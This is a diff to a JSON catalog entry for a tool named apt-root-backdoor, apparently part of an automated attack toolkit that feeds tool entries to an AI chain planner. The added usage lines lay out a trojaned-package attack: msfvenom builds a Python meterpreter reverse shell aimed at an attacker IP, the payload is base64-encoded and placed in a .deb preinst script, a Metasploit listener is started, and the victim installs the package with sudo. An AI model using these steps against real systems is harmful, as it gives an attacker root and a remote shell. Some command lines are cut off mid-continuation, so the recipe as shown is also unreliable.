@@ -8,68 +8,19 @@
   "url": "https://github.com/abdulrafayishaCkER/apt-root-backdoor",
   "summary": "Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages",
   "documentation": {
-    "readme": "Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages",
-    "usage_sections": [],
+    "readme": "Exploiting apt install to Gain Root Access via Malicious .deb Packages",
+    "usage_sections": [
+      "Detailed Proof of Concept",
+      "Step 1 — Extract & Inspect the Package",
+      "Step 2 — Generate the Reverse Shell Payload",
+      "Step 3 — Embed the Payload in preinst",
+      "Step 4 — Repack the .deb Package"
+    ],
     "arguments": [
       {
-        "name": "--contact",
-        "description": "CLI flag '--contact' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--deliver-the-payload",
-        "description": "CLI flag '--deliver-the-payload' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--embed-the-payload-in-preinst",
-        "description": "CLI flag '--embed-the-payload-in-preinst' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--extract--inspect-the-package",
-        "description": "CLI flag '--extract--inspect-the-package' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--generate-the-reverse-shell-payload",
-        "description": "CLI flag '--generate-the-reverse-shell-payload' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--info",
-        "description": "CLI flag '--info' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--mitigation",
-        "description": "CLI flag '--mitigation' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--repack-the-deb-package",
-        "description": "CLI flag '--repack-the-deb-package' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--set-up-the-metasploit-listener",
-        "description": "CLI flag '--set-up-the-metasploit-listener' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "--verify",
-        "description": "CLI flag '--verify' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "-O",
-        "description": "CLI flag '-O' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
-      },
-      {
-        "name": "-R",
-        "description": "CLI flag '-R' accepted by the tool; behavior is implementation-defined and should be confirmed against the upstream README.",
-        "source": "v2_enhancement"
+        "name": "-hostname",
+        "description": "Linux victim-hostname 5.x.x ...",
+        "source": "docs"
       },
       {
         "name": "--target",
@@ -193,7 +144,18 @@
         "source": "v2_enhancement"
       }
     ],
-    "examples": [],
+    "examples": [
+      "sudo apt install ./malicious.deb",
+      "dpkg-deb -R filesearch_1.0.deb extracted/",
+      "msfvenom -p python/meterpreter_reverse_tcp \\",
+      "LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py",
+      "base64 /tmp/payload.py > /tmp/payload.b64",
+      "dpkg-deb -b extracted/ new_malicious.deb",
+      "msfconsole -x \"use exploit/multi/handler; \\",
+      "set payload python/meterpreter/reverse_tcp; \\",
+      "dpkg-deb -R filesearch_1.0.deb extracted_folder/",
+      "ls -la extracted_folder/DEBIAN/"
+    ],
     "file_listing": [
       "DISCLAIMER.md",
       "LICENSE",
@@ -250,13 +212,9 @@
         "score": 1
       }
     ],
-    "when_to_use": "Use this tool when the engagement is in the 'post_exploit' phase against a target with '['web', 'shell_windows', 'shell_linux']' as the attack surface (command_and_control, toolbox, github).",
-    "why_to_use": "This tool is preferred because: Index entry in the Command and Control category. Use as a candidate tool in the chain planner after a NVD/lookup pass on the target vendor.",
-    "how_to_use": [
-      "Step 1: cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --help",
-      "Step 2: cd toolboxes/apt-root-backdoor && cat README.md",
-      "Step 3: cd toolboxes/apt-root-backdoor && ls -la"
-    ]
+    "when_to_use": "Use during the 'post_exploit' phase against surfaces [web, shell_windows, shell_linux] in the Command and Control category. Fits when the engagement needs: Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages.",
+    "why_to_use": "Prefer this tool based on upstream description: Exploiting apt install to Gain Root Access via Malicious .deb Packages.",
+    "how_to_use": "Install/setup: git clone https://github.com/abdulrafayishaCkER/apt-root-backdoor.git. Run the primary entrypoint as shown in upstream docs, e.g. `sudo apt install ./malicious.deb`. Further invocations from upstream: `dpkg-deb -R filesearch_1.0.deb extracted/`; `msfvenom -p python/meterpreter_reverse_tcp \\`. Exploiting apt install to Gain Root Access via Malicious .deb Packages."
   },
   "metadata_status": "enriched",
   "trust": {
@@ -288,18 +246,26 @@
     "target-adaptive"
   ],
   "use_cases": [
-    "Index entry in the Command and Control category. Use as a candidate tool in the chain planner after a NVD/lookup pass on the target vendor.",
-    "Pairs with the Command and Control system-prompt stanza in core.ai_backend.chain to teach the LLM the standard invocation pattern.",
-    "Operator-initiated: the chain step is gated by the per-step ACCEPT/CANCEL gate; the tool does not auto-execute.",
-    "Use as a reference implementation when designing a new v3 method for this category.",
-    "Use as a teaching example in the prompt stanza so the LLM can reason about the right run order."
+    "When you need Command and Control, use apt-root-backdoor because Exploiting `apt install` to Gain Root Access via Malicious `.deb` Packages.",
+    "When the engagement is in the post_exploit phase, use apt-root-backdoor as a cataloged Command and Control tool with operator ACCEPT/CANCEL gating.",
+    "When you need a concrete invocation, run `sudo apt install ./malicious.deb` as documented upstream for apt-root-backdoor.",
+    "When you need a concrete invocation, run `dpkg-deb -R filesearch_1.0.deb extracted/` as documented upstream for apt-root-backdoor.",
+    "When you need a concrete invocation, run `msfvenom -p python/meterpreter_reverse_tcp \\` as documented upstream for apt-root-backdoor.",
+    "When you need a concrete invocation, run `LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py` as documented upstream for apt-root-backdoor.",
+    "When chaining Command and Control tools, pair apt-root-backdoor with sibling catalog entries sharing its attack_surface/phase_hint.",
+    "When validating lab setup, run `apt-root-backdoor --help` (or the README entrypoint) and confirm required hardware/deps from the catalog."
   ],
   "command_examples": [
-    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --help",
-    "cd toolboxes/apt-root-backdoor && cat README.md",
-    "cd toolboxes/apt-root-backdoor && ls -la",
-    "cd toolboxes/apt-root-backdoor && python3 apt-root-backdoor.py --target $KFIOSA_TARGET_HOST",
-    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST apt-root-backdoor --output $KFIOSA_OUTPUT_DIR/apt-root-backdoor.log"
+    "sudo apt install ./malicious.deb",
+    "dpkg-deb -R filesearch_1.0.deb extracted/",
+    "msfvenom -p python/meterpreter_reverse_tcp \\",
+    "LHOST=YOUR_IP LPORT=4444 -f raw > /tmp/payload.py",
+    "base64 /tmp/payload.py > /tmp/payload.b64",
+    "dpkg-deb -b extracted/ new_malicious.deb",
+    "msfconsole -x \"use exploit/multi/handler; \\",
+    "set payload python/meterpreter/reverse_tcp; \\",
+    "dpkg-deb -R filesearch_1.0.deb extracted_folder/",
+    "ls -la extracted_folder/DEBIAN/"
   ],
   "attack_surface": [
     "web",
@@ -322,5 +288,7 @@
   "_kfiosa_enriched_at": "phase4_t16",
   "_languages": [
     "shell"
-  ]
+  ],
+  "_kfiosa_enhanced_v3": true,
+  "_enhanced_via": "local_readme"
 }
